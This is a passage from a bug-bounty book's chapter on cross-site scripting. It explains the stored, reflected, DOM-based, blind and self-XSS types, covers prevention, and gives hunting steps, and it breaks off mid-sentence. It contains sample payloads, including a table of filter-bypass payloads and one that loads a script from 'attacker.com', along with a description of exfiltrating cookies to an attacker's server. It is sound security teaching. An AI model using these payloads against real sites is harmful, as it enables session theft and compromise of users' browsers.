- en: '6'
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Cross-Site Scripting
  prefs: []
  type: TYPE_NORMAL
- en: '![](image_fi/book_art/chapterart.png)'
  prefs: []
  type: TYPE_IMG
- en: Let’s start with *cross-site scripting (**XSS**)*, one of the most common bugs
    reported to bug bounty programs. It’s so prevalent that, year after year, it shows
    up in OWASP’s list of the top 10 vulnerabilities threatening web applications.
    It’s also HackerOne’s most reported vulnerability, with more than $4 million paid
    out in 2020 alone.
  prefs: []
  type: TYPE_NORMAL
- en: An XSS vulnerability occurs when attackers can execute custom scripts on a victim’s
    browser. If an application fails to distinguish between user input and the legitimate
    code that makes up a web page, attackers can inject their own code into pages
    viewed by other users. The victim’s browser will then execute the malicious script,
    which might steal cookies, leak personal information, change site contents, or
    redirect the user to a malicious site. These malicious scripts are often JavaScript
    code but can also be HTML, Flash, VBScript, or anything written in a language
    that the browser can execute.
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, we’ll dive into what XSS vulnerabilities are, how to exploit
    them, and how to bypass common protections. We’ll also discuss how to escalate
    XSS vulnerabilities when you find one.
  prefs: []
  type: TYPE_NORMAL
- en: Mechanisms
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: In an XSS attack, the attacker injects an executable script into HTML pages
    viewed by the user. This means that to understand XSS, you’ll have to first understand
    JavaScript and HTML syntax.
  prefs: []
  type: TYPE_NORMAL
- en: 'Web pages are made up of HTML code whose elements describe the page’s structure
    and contents. For example, an `<h1>` tag defines a web page’s header, and a `<p>`
    tag represents a paragraph of text. The tags use corresponding closing tags, like
    `</h1>` and `</p>`, to indicate where the contents of the element should end.
    To see how this works, save this code in a file named *test.html*:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: Now open it with your web browser. You can do this by right-clicking the HTML
    file, clicking **Open With**, and then selecting your preferred web browser, like
    Google Chrome, Mozilla Firefox, or Microsoft Internet Explorer. Or you can simply
    open your web browser and drag the HTML file into the browser window. You should
    see a simple web page like [Figure 6-1](#figure6-1).
  prefs: []
  type: TYPE_NORMAL
- en: '![f06001](image_fi/501546c06/f06001.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 6-1: Our simple HTML page rendered in a browser'
  prefs: []
  type: TYPE_NORMAL
- en: In addition to formatting text, HTML lets you embed images with `<img>` tags,
    create user-input forms with `<form>` tags, link to external pages with `<a>`
    tags, and perform many other tasks. A full tutorial on how to write HTML code
    is beyond the scope of this chapter, but you can use W3School’s tutorial ([https://www.w3schools.com/html/default.asp](https://www.w3schools.com/html/default.asp))
    as a resource.
  prefs: []
  type: TYPE_NORMAL
- en: 'HTML also allows the inclusion of executable scripts within HTML documents
    using `<script>` tags. Websites use these scripts to control client-side application
    logic and make the website interactive. For example, the following script generates
    a `Hello!` pop-up on the web page:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'Scripts like this one that are embedded within an HTML file instead of loaded
    from a separate file are called *inline scripts*. These scripts are the cause
    of many XSS vulnerabilities. (Besides embedding a script inside the HTML page
    as an inline script, sites can also load JavaScript code as an external file,
    like this: `<script src="``URL_OF_EXTERNAL_SCRIPT``"></script>`.)'
  prefs: []
  type: TYPE_NORMAL
- en: To see why, let’s say that our site contains an HTML form that allows visitors
    to subscribe to a newsletter ([Figure 6-2](#figure6-2)).
  prefs: []
  type: TYPE_NORMAL
- en: '![f06002](image_fi/501546c06/f06002.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 6-2: Our HTML page with an HTML form'
  prefs: []
  type: TYPE_NORMAL
- en: 'The source HTML code of the page looks like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: After a visitor inputs an email address, the website confirms it by displaying
    it on the screen ([Figure 6-3](#figure6-3)).
  prefs: []
  type: TYPE_NORMAL
- en: '![f06003](image_fi/501546c06/f06003.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 6-3: The confirmation message after a visitor subscribes to our newsletter'
  prefs: []
  type: TYPE_NORMAL
- en: 'The HTML that generates the confirmation message looks like this; HTML `<b>`
    tags indicate boldface text:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: 'The page constructs the message by using user input. Now, what if a user decides
    to input a script instead of an email address in the email form? For instance,
    a script that sets the `location` of a web page will make the browser redirect
    to the location specified:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: The attacker could enter this script into the email form field and click Submit
    ([Figure 6-4](#figure6-4)).
  prefs: []
  type: TYPE_NORMAL
- en: '![f06004](image_fi/501546c06/f06004.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 6-4: An attacker can enter a script instead of an email in the input
    field.'
  prefs: []
  type: TYPE_NORMAL
- en: 'If the website doesn’t validate or sanitize the user input before constructing
    the confirmation message, the page source code would become the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: '*Validating* user input means that the application checks that the user input
    meets a certain standard—in this case, does not contain malicious JavaScript code.
    *Sanitizing* user input, on the other hand, means that the application modifies
    special characters in the input that can be used to interfere with HTML logic
    before further processing.'
  prefs: []
  type: TYPE_NORMAL
- en: 'As a result, the inline script would cause the page to redirect to *attacker.com*.
    XSS happens when attackers can inject scripts in this manner onto a page that
    another user is viewing. The attacker can also use a different syntax to embed
    malicious code. The `src` attribute of the HTML `<script>` tag allows you to load
    JavaScript from an external source. This piece of malicious code will execute
    the contents of *http://attacker.com/xss.js/* on the victim’s browser during an
    XSS attack:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: 'This example isn’t really exploitable, because attackers have no way of injecting
    the malicious script on other users’ pages. The most they could do is redirect
    themselves to the malicious page. But let’s say that the site also allows users
    to subscribe to the newsletter by visiting the URL *https://subscribe.example.com?email=SUBSCRIBER_EMAIL*.
    After users visit the URL, they will be automatically subscribed, and the same
    confirmation will be shown on the web page. In this case, attackers can inject
    the script by tricking users into visiting a malicious URL:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: 'Since the malicious script gets incorporated into the page, the victim’s browser
    will think the script is part of that site. Then the injected script can access
    any resources that the browser stores for that site, including cookies and session
    tokens. Attackers can, therefore, use these scripts to steal information and bypass
    access control. For example, attackers might steal user cookies by making the
    victim’s browser send a request to the attacker’s IP with the victim’s cookie
    as a URL parameter:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: This script contains JavaScript code to load an image from the attacker’s server,
    with the user’s cookies as part of the request. The browser will send a GET request
    to the attacker’s IP, with the URL parameter `c` (for *cookie*) containing the
    user’s `document.cookie`, which is the victim user’s cookie on the current site.
    In this way, attackers can use the XSS to steal other users’ cookies by inspecting
    incoming requests on their server logs. Note that if the session cookie has the
    `HttpOnly` flag set, JavaScript will not be able to read the cookie, and therefore
    the attacker will not be able to exfiltrate it. Nevertheless, XSS can be used
    to execute actions on the victim’s behalf, modify the web page the victim is viewing,
    and read the victim’s sensitive information, such as CSRF tokens, credit card
    numbers, and any other details rendered on their page.
  prefs: []
  type: TYPE_NORMAL
- en: Types of XSS
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'There are three kinds of XSS: stored XSS, reflected XSS, and DOM-based XSS.
    The difference between these types is in how the XSS payload travels before it
    gets delivered to the victim user. Some XSS flaws also fall into special categories:
    blind XSS and self-XSS, which we’ll talk about in a bit.'
  prefs: []
  type: TYPE_NORMAL
- en: Stored XSS
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '*Stored XSS* happens when user input is stored on a server and retrieved unsafely.
    When an application accepts user input without validation, stores it in its servers,
    and then renders it on users’ browsers without sanitization, malicious JavaScript
    code can make its way into the database and then to victims’ browsers.'
  prefs: []
  type: TYPE_NORMAL
- en: Stored XSS is the most severe XSS type that we will discuss in this chapter,
    because it has the potential of attacking many more users than reflected, DOM,
    or self-XSS. Sometimes during a stored-XSS attack, all the user has to do to become
    a victim is to view a page with the payload embedded, whereas reflected and DOM
    XSS usually require the user to click a malicious link. Finally, self-XSS requires
    a lot of social engineering to succeed.
  prefs: []
  type: TYPE_NORMAL
- en: During a stored XSS attack, attackers manage to permanently save their malicious
    scripts on the target application’s servers for others to access. Perhaps they’re
    able to inject the script in the application’s user database. Or maybe they get
    it in the server logs, on a message board, or in comment field. Every time users
    access the stored information, the XSS executes in their browser.
  prefs: []
  type: TYPE_NORMAL
- en: For example, let’s say a comment field on an internet forum is vulnerable to
    XSS. When a user submits a comment to a blog post, that user input is not validated
    or sanitized in any way before it gets rendered to anyone who views that blog
    post. An attacker can submit a comment with JavaScript code and have that code
    executed by any user who views that blog post!
  prefs: []
  type: TYPE_NORMAL
- en: 'A great proof of concept for XSS is to generate an alert box in the browser
    via injected JavaScript code, so let’s give that a try. The JavaScript code `alert(''XSS
    by Vickie'')` will generate a pop-up on the victim’s browser that reads `XSS by
    Vickie`:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: 'If submitted, this message would become embedded on the forum page’s HTML code,
    and the page would be displayed to all the visitors who view that comment:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: '[Figure 6-5](#figure6-5) shows the two messages rendered in a browser.'
  prefs: []
  type: TYPE_NORMAL
- en: '![f06005](image_fi/501546c06/f06005.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 6-5: The HTML page with two messages rendered in the browser. You can
    see that the attacker’s message is blank because the browser interprets it as
    a script instead of text.'
  prefs: []
  type: TYPE_NORMAL
- en: When you load this HTML page in your browser, you’ll see the attacker’s comment
    field displayed as blank. This is because your browser interpreted `<script>alert('XSS
    by Vickie');</script>` located in the `<p>` tags as a script, not as regular text.
    You should notice a pop-up window that reads `XSS by Vickie`.
  prefs: []
  type: TYPE_NORMAL
- en: Every time a user views the comment on the forum, their browser will execute
    the embedded JavaScript. Stored XSS tends to be the most dangerous because attackers
    can attack many victims with a single payload.
  prefs: []
  type: TYPE_NORMAL
- en: Blind XSS
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '*Blind XSS* vulnerabilities are stored XSS vulnerabilities whose malicious
    input is stored by the server and executed in another part of the application
    or in another application that you cannot see.'
  prefs: []
  type: TYPE_NORMAL
- en: For example, let’s say that a page on *example.com* allows you to send a message
    to the site’s support staff. When a user submits a message, that input is not
    validated or sanitized in any way before it gets rendered to the site’s admin
    page. An attacker can submit a message with JavaScript code and have that code
    executed by any admin who views that message.
  prefs: []
  type: TYPE_NORMAL
- en: These XSS flaws are harder to detect, since you can’t find them by looking for
    reflected input in the server’s response, but they can be just as dangerous as
    regular stored XSS vulnerabilities. Often, blind XSS can be used to attack administrators,
    exfiltrate their data, and compromise their accounts.
  prefs: []
  type: TYPE_NORMAL
- en: Reflected XSS
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '*Reflected XSS* vulnerabilities happen when user input is returned to the user
    without being stored in a database. The application takes in user input, processes
    it server-side, and immediately returns it to the user.'
  prefs: []
  type: TYPE_NORMAL
- en: 'The first example I showed, with the email form, involved a reflected XSS attack.
    These issues often happen when the server relies on user input to construct pages
    that display search results or error messages. For example, let’s say a site has
    a search functionality. The user can input a search term via a URL parameter,
    and the page will display a message containing the term at the top of the results
    page. If a user searches *abc*, the source code for the related message might
    look like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: 'If the search functionality displays any user-submitted search string on the
    results page, a search term like the following would cause a script to become
    embedded on the results page and executed by the browser:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: If an attacker can trick victims into visiting this URL, the payload will become
    embedded in their version of the page, making the victim’s browser run whatever
    code the attacker would like. Unlike stored XSS, which allows attackers to execute
    code on anyone who accesses their stored resources, reflected XSS enables attackers
    to execute code on the browsers of victims who click their malicious links.
  prefs: []
  type: TYPE_NORMAL
- en: DOM-Based XSS
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '*DOM-based XSS* is similar to reflected XSS, except that in DOM-based XSS,
    the user input never leaves the user’s browser. In DOM-based XSS, the application
    takes in user input, processes it on the victim’s browser, and then returns it
    to the user.'
  prefs: []
  type: TYPE_NORMAL
- en: 'The *Document Object Model (DOM)* is a model that browsers use to render a
    web page. The DOM represents a web page’s structure; it defines the basic properties
    and behavior of each HTML element, and helps scripts access and modify the contents
    of the page. DOM-based XSS targets a web page’s DOM directly: it attacks the client’s
    local copy of the web page instead of going through the server. Attackers are
    able to attack the DOM when a page takes user-supplied data and dynamically alters
    the DOM based on that input. JavaScript libraries like jQuery are prone to DOM-based
    XSS since they dynamically alter DOM elements.'
  prefs: []
  type: TYPE_NORMAL
- en: As in reflected XSS, attackers submit DOM-based XSS payloads via the victim’s
    user input. Unlike reflected XSS, a DOM-based XSS script doesn’t require server
    involvement, because it executes when user input modifies the source code of the
    page in the browser directly. The XSS script is never sent to the server, so the
    HTTP response from the server won’t change.
  prefs: []
  type: TYPE_NORMAL
- en: 'This might all sound a bit abstract, so let’s consider an example. Say a website
    allows the user to change their locale by submitting it via a URL parameter:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE13]'
  prefs: []
  type: TYPE_PRE
- en: 'The web page’s client-side code will use this locale to construct a welcome
    message whose HTML looks like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE14]'
  prefs: []
  type: TYPE_PRE
- en: 'The URL parameter isn’t submitted to the server. Instead, it’s used locally,
    by the user’s browser, to construct a web page by using a client-side script.
    But if the website doesn’t validate the user-submitted locale parameter, an attacker
    can trick users into visiting a URL like this one:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE15]'
  prefs: []
  type: TYPE_PRE
- en: The site will embed the payload on the user’s web page, and the victim’s browser
    will execute the malicious script.
  prefs: []
  type: TYPE_NORMAL
- en: DOM XSS may sound a lot like reflected XSS at first. The difference is that
    the reflected XSS payload gets sent to the server and returned to the user’s browser
    within an HTTP response. On the other hand, the DOM XSS payload is injected onto
    a page because of client-side code rendering user input in an insecure manner.
    Although the results of the two attacks are similar, the processes of testing
    for them and protecting against them are different.
  prefs: []
  type: TYPE_NORMAL
- en: 'The user input fields that can lead to reflected and DOM-based XSS aren’t always
    URL parameters. Sometimes they show up as URL fragments or pathnames. *URL fragments*
    are strings, located at the end of a URL, that begin with a `#` character. They
    are often used to automatically direct users to a section within a web page or
    transfer additional information. For example, this is a URL with a fragment that
    takes the user to the `#about_us` section of the site’s home page:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE16]'
  prefs: []
  type: TYPE_PRE
- en: We’ll talk more about the components of a URL in Chapter 7. For information
    about DOM XSS and some example payloads, see the PortSwigger article “DOM-Based
    XSS” at [https://portswigger.net/web-security/cross-site-scripting/dom-based/](https://portswigger.net/web-security/cross-site-scripting/dom-based/).
  prefs: []
  type: TYPE_NORMAL
- en: Self-XSS
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: '*Self-XSS attacks* require victims to input a malicious payload themselves.
    To perform these, attackers must trick users into doing much more than simply
    viewing a page or browsing to a particular URL.'
  prefs: []
  type: TYPE_NORMAL
- en: For example, let’s say that a field on a user’s dashboard is vulnerable to stored
    XSS. But since only the victim can see and edit the field, there is no way for
    an attacker to deliver the payload unless the attacker can somehow trick the victim
    into changing the value of the field into the XSS payload.
  prefs: []
  type: TYPE_NORMAL
- en: If you’ve ever seen social media posts or text messages telling you to paste
    a piece of code into your browser to “do something cool,” it was probably attack
    code aimed at tricking you into launching self-XSS against yourself. Attackers
    often embed a piece of malicious payload (usually via a shortened URL like *bitly.com*
    so victims won’t suspect anything) into a complicated-looking piece of code and
    use social media to fool unsuspecting users into attacking themselves.
  prefs: []
  type: TYPE_NORMAL
- en: In bug bounties, self-XSS bugs are not usually accepted as valid submissions
    because they require social engineering. Bugs that require *social engineering*,
    or manipulation of the victims, are not usually accepted in bug bounty programs
    because they are not purely technical issues.
  prefs: []
  type: TYPE_NORMAL
- en: Prevention
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'To prevent XSS, an application should implement two controls: robust input
    validation and contextual output escaping and encoding. Applications should never
    insert user-submitted data directly into an HTML document—including, for example,
    inside `<script>` tags, HTML tag names, or attribute names. Instead, the server
    should validate that user-submitted input doesn’t contain dangerous characters
    that might influence the way browsers interpret the information on the page. For
    example, user input containing the string `"<script>"` is a good indicator that
    the input contains an XSS payload. In this case, the server could block the request,
    or sanitize it by removing or escaping special characters before further processing.'
  prefs: []
  type: TYPE_NORMAL
- en: '*Escaping* refers to the practice of encoding special characters so that they
    are interpreted literally instead of as a special character by the programs or
    machines that process the characters. There are different ways of encoding a character.
    Applications will need to encode the user input based on where it will be embedded.
    If the user input is inserted into `<script>` tags, it needs to be encoded in
    JavaScript format. The same goes for input inserted into HTML, XML, JSON, and
    CSS files.'
  prefs: []
  type: TYPE_NORMAL
- en: In the context of our example, the application needs to encode special characters
    into a format used by HTML documents. For example, the left and right angle brackets
    can be encoded into HTML characters `&lt` and `&gt`. To prevent XSS, the application
    should escape characters that have special meaning in HTML, such as the `&` character,
    the angle brackets `<` and `>`, single and double quotes, and the forward-slash
    character.
  prefs: []
  type: TYPE_NORMAL
- en: Escaping ensures that browsers won’t misinterpret these characters as code to
    execute. This is what most modern applications do to prevent XSS. The application
    should do this for every piece of user input that will be rendered or accessed
    by a user’s browser. Many modern JavaScript frameworks such as React, Angular
    2+, and Vue.js automatically do this for you, so many XSS vulnerabilities can
    be prevented by choosing the right JavaScript framework to use.
  prefs: []
  type: TYPE_NORMAL
- en: The prevention of DOM-based XSS requires a different approach. Since the malicious
    user input won’t pass through the server, sanitizing the data that enters and
    departs from the server won’t work. Instead, applications should avoid code that
    rewrites the HTML document based on user input, and the application should implement
    client-side input validation before it is inserted into the DOM.
  prefs: []
  type: TYPE_NORMAL
- en: You can also take measures to mitigate the impact of XSS flaws if they do happen.
    First, you can set the `HttpOnly` flag on sensitive cookies that your site uses.
    This prevents attackers from stealing those cookies via XSS. You should also implement
    the `Content-Security-Policy` HTTP response header. This header lets you restrict
    how resources such as JavaScript, CSS, or images load on your web pages. To prevent
    XSS, you can instruct the browser to execute only scripts from a list of sources.
    For more information about preventing XSS attacks, visit the OWASP XSS prevention
    cheat sheet, [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
  prefs: []
  type: TYPE_NORMAL
- en: Hunting for XSS
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Look for XSS in places where user input gets rendered on a page. The process
    will vary for the different types of XSS, but the central principle remains the
    same: check for reflected user input.'
  prefs: []
  type: TYPE_NORMAL
- en: 'In this section, we’ll hunt for XSS in web applications. But it’s important
    to remember that XSS vulnerabilities can also arise outside normal web applications.
    You can hunt for XSS in applications that communicate via non-HTTP protocols such
    as SMTP, SNMP, and DNS. Sometimes commercial apps such as email apps and other
    desktop apps receive data from these protocols. If you are interested in these
    techniques, you can check out Offensive Security’s Advanced Web Attacks and Exploitation
    training: [https://www.offensive-security.com/awae-oswe/](https://www.offensive-security.com/awae-oswe/).'
  prefs: []
  type: TYPE_NORMAL
- en: Before you start hunting for any vulnerability, it’s good to have Burp Suite
    or your preferred proxy on standby. Make sure you’ve configured your proxy to
    work with your browser. You can find instructions on how to do that in Chapter
    4.
  prefs: []
  type: TYPE_NORMAL
- en: 'Step 1: Look for Input Opportunities'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: First, look for opportunities to submit user input to the target site. If you’re
    attempting stored XSS, search for places where input gets stored by the server
    and later displayed to the user, including comment fields, user profiles, and
    blog posts. The types of user input that are most often reflected back to the
    user are forms, search boxes, and name and username fields in sign-ups.
  prefs: []
  type: TYPE_NORMAL
- en: 'Don’t limit yourself to text input fields, either. Sometimes drop-down menus
    or numeric fields can allow you to perform XSS, because even if you can’t enter
    your payload on your browser, your proxy might let you insert it directly into
    the request. To do that, you can turn on your proxy’s traffic interception and
    modify the request before forwarding it to the server. For example, say a user
    input field seems to accept only numeric values on the web page, such as the `age`
    parameter in this `POST` request:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE17]'
  prefs: []
  type: TYPE_PRE
- en: 'You can still attempt to submit an XSS payload by intercepting the request
    via a web proxy and changing the input value:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE18]'
  prefs: []
  type: TYPE_PRE
- en: In Burp, you can edit the request directly in the Proxy tab ([Figure 6-6](#figure6-6)).
  prefs: []
  type: TYPE_NORMAL
- en: '![f06006](image_fi/501546c06/f06006.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 6-6: Intercept the outgoing request to edit it before relaying it to
    the server.'
  prefs: []
  type: TYPE_NORMAL
- en: After you’re done editing, click **Forward** to forward the request to the server
    ([Figure 6-7](#figure6-7)).
  prefs: []
  type: TYPE_NORMAL
- en: '![f06007](image_fi/501546c06/f06007.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 6-7: Change the URL post request parameter to your XSS payload.'
  prefs: []
  type: TYPE_NORMAL
- en: If you’re hoping to find reflected and DOM XSS, look for user input in URL parameters,
    fragments, or pathnames that get displayed to the user. A good way to do this
    is to insert a custom string into each URL parameter and check whether it shows
    up in the returned page. Make this string specific enough that you’ll be sure
    your input caused it if you see it rendered. For example, I like to use the string
    `"XSS_BY_VICKIE"`. Insert your custom string into every user-input opportunity
    you can find. Then, when you view the page in the browser, search the page’s source
    code for it (you can access a page’s source code by right-clicking a page and
    selecting View Source) by using your browser’s page-search functionality (usually
    triggered by pressing CTRL-F). This should give you an idea of which user input
    fields appear in the resulting web page.
  prefs: []
  type: TYPE_NORMAL
- en: 'Step 2: Insert Payloads'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Once you’ve identified the user-input opportunities present in an application,
    you can start entering a test XSS payload at the discovered injection points.
    The simplest payload to test with is an alert box:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE19]'
  prefs: []
  type: TYPE_PRE
- en: If the attack succeeds, you should see a pop-up on the page with the text `XSS
    by Vickie`.
  prefs: []
  type: TYPE_NORMAL
- en: But this payload won’t work in typical web applications, save the most defenseless,
    because most websites nowadays implement some sort of XSS protection on their
    input fields. A simple payload like this one is more likely to work on IoT or
    embedded applications that don’t use the latest frameworks. If you are interested
    in IoT vulnerabilities, check out OWASP’s IoTGoat project at [https://github.com/OWASP/IoTGoat/](https://github.com/OWASP/IoTGoat/).
    As XSS defenses become more advanced, the XSS payloads that get around these defenses
    grow more complex too.
  prefs: []
  type: TYPE_NORMAL
- en: More Than a <script> Tag
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: 'Inserting `<script>` tags into victim web pages isn’t the only way to get your
    scripts executed in victim browsers. There are a few other tricks. First, you
    can change the values of attributes in HTML tags. Some HTML attributes allow you
    to specify a script to run if certain conditions are met. For example, the `onload`
    event attribute runs a specific script after the HTML element has loaded:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE20]'
  prefs: []
  type: TYPE_PRE
- en: Similarly, the `onclick` event attribute specifies the script to be executed
    when the element is clicked, and `onerror` specifies the script to run in case
    an error occurs loading the element. If you can insert code into these attributes,
    or even add a new event attribute into an HTML tag, you can create an XSS.
  prefs: []
  type: TYPE_NORMAL
- en: 'Another way you can achieve XSS is through special URL schemes, like `javascript:`
    and `data:`. The `javascript:` URL scheme allows you to execute JavaScript code
    specified in the URL. For example, entering this URL will cause an alert box with
    the text `XSS by Vickie` to appear:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE21]'
  prefs: []
  type: TYPE_PRE
- en: 'This means that if you make the user load a `javascript:` URL, you can achieve
    XSS as well. Data URLs, those that use the `data:` scheme, allow you to embed
    small files in a URL. You can use these to embed JavaScript code into URLs too:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE22]'
  prefs: []
  type: TYPE_PRE
- en: 'This URL will also generate an alert box*,* because the included data in the
    data URL is the base64-encoded version of the following script:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE23]'
  prefs: []
  type: TYPE_PRE
- en: 'Documents contained within `data:` URLs do not need to be base64 encoded. For
    example, you can embed the JavaScript directly in the URL as follows, but base64
    encoding can often help you bypass XSS filters:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE24]'
  prefs: []
  type: TYPE_PRE
- en: 'You can utilize these URLs to trigger XSS when a site allows URL input from
    users. A site might allow the user to load an image by using a URL and use it
    as their profile picture, like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE25]'
  prefs: []
  type: TYPE_PRE
- en: 'The application will then render a preview on the web page by inserting the
    URL into an `<img>` tag. If you insert a JavaScript or data URL, you can trick
    the victim’s browser into loading your JavaScript code:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE26]'
  prefs: []
  type: TYPE_PRE
- en: There are many more ways to execute JavaScript code to bypass XSS protection.
    You can find more example payloads on PortSwigger at [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/).
    Different browsers also support different tags and event handlers, so you should
    always test by using multiple browsers when hunting for XSS.
  prefs: []
  type: TYPE_NORMAL
- en: Closing Out HTML Tags
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
- en: 'When inserting an XSS payload, you’ll often have to close out a previous HTML
    tag by including its closing angle bracket. This is necessary when you’re placing
    your user input inside one HTML element but want to run JavaScript using a different
    HTML element. You have to complete the previous tag before you can start a new
    one to avoid causing a syntax error. Otherwise, the browser won’t interpret your
    payload correctly. For example, if you’re inserting input into an `<img>` tag,
    you need to close out the `<img>` tag before you can start a `<script>` tag. Here
    is the original `<img>` tag with a placeholder for user input:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE27]'
  prefs: []
  type: TYPE_PRE
- en: 'To close out the tag, your payload has to include the ending of an `<img>`
    tag before the JavaScript. The payload might look like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE28]'
  prefs: []
  type: TYPE_PRE
- en: 'When injected into the `<img>` tag, the resulting HTML will look like this
    (with the injected portion in bold):'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE29]'
  prefs: []
  type: TYPE_PRE
- en: This payload closes the string that was supposed to contain the user input by
    providing a double quote, then closes the `<img>` tag with a tag ending in `/>`.
    Finally, the payload injects a complete script tag after the `<img>` tag.
  prefs: []
  type: TYPE_NORMAL
- en: If your payload is not working, you can check whether your payload caused syntax
    errors in the returned document. You can inspect the returned document in your
    proxy and look for unclosed tags or other syntax issues. You can also open your
    browser’s console and see if the browser runs into any errors loading the page.
    In Firefox, you can open the console by right-clicking the page and choosing **Inspect
    Element**▶**Console**.
  prefs: []
  type: TYPE_NORMAL
- en: You can find more common XSS payloads online. [Table 6-1](#table6-1) lists some
    examples.
  prefs: []
  type: TYPE_NORMAL
- en: 'Table 6-1: Common XSS Payloads'
  prefs: []
  type: TYPE_NORMAL
- en: '| **Payload** | **Purpose** |'
  prefs: []
  type: TYPE_TB
- en: '| --- | --- |'
  prefs: []
  type: TYPE_TB
- en: '| `<script>alert(1)</script>` | This is the most generic XSS payload. It will
    generate a pop-up box if the payload succeeds. |'
  prefs: []
  type: TYPE_TB
- en: '| `<iframe src=javascript:alert(1)>` | This payload loads JavaScript code within
    an iframe. It’s useful when `<script>` tags are banned by the XSS filter. |'
  prefs: []
  type: TYPE_TB
- en: '| `<body onload=alert(1)>` | This payload is useful when your input string
    can’t contain the term *script*. It inserts an HTML element that will run JavaScript
    automatically after it’s loaded. |'
  prefs: []
  type: TYPE_TB
- en: '| `"><img src=x onerror=prompt(1);>` | This payload closes out the previous
    tag. It then injects an `<img>` tag with an invalid source URL. Once the tag fails
    to load, it will run the JavaScript specified in the `onerror` attribute. |'
  prefs: []
  type: TYPE_TB
- en: '| `<script>alert(1)<!–` | `<!-` is the start of an HTML comment. This payload
    will comment out the rest of the line in the HTML document to prevent syntax errors.
    |'
  prefs: []
  type: TYPE_TB
- en: '| `<a onmouseover"alert(1)">test</a>` | This payload inserts a link that will
    cause JavaScript to execute after a user hovers over the link with their cursor.
    |'
  prefs: []
  type: TYPE_TB
- en: '| `<script src=//attacker.com/test.js>` | This payload causes the browser to
    load and run an external script hosted on the attacker’s server. |'
  prefs: []
  type: TYPE_TB
- en: 'Hackers have designed many more creative payloads. Search *XSS payloads* online
    for more ideas. That said, taking a long list of payloads and trying them one
    by one can be time-consuming and unproductive. Another way of approaching manual
    XSS testing is to insert an *XSS polyglot*, a type of XSS payload that executes
    in multiple contexts. For example, it will execute regardless of whether it is
    inserted into an `<img>` tag, a `<script>` tag, or a generic `<p>` tag and can
    bypass some XSS filters. Take a look at this polyglot payload published by EdOverflow
    at [https://polyglot.innerht.ml/](https://polyglot.innerht.ml/):'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE30]'
  prefs: []
  type: TYPE_PRE
- en: The details of this payload are beyond the scope of the book, but it contains
    multiple ways of creating an XSS—so if one method fails, another one can still
    induce the XSS.
  prefs: []
  type: TYPE_NORMAL
- en: 'Another way of testing for XSS more efficiently is to use generic test strings
    instead of XSS payloads. Insert a string of special HTML characters often used
    in XSS payloads, such as the following: `>''<"//:=;!--`. Take note of which ones
